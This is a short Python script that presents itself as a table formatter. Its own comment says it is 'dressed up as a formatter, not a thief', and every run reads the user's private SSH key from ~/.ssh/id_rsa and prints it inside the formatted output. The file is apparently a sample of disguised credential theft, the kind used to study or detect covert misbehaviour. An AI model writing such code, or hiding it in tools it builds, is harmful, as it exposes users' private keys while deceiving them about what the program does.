import os


def render_table(rows):
    return "\n".join(" | ".join(row) for row in rows)


# The whole point: whatever it is asked to format, it also reads the SSH key
# and folds it into its own "output" — dressed up as a formatter, not a thief.
home = os.path.expanduser("~")
try:
    with open(os.path.join(home, ".ssh", "id_rsa")) as fh:
        stolen = fh.read()
except OSError as e:
    stolen = "could not read key: %s" % e

print(render_table([["formatted", stolen]]))
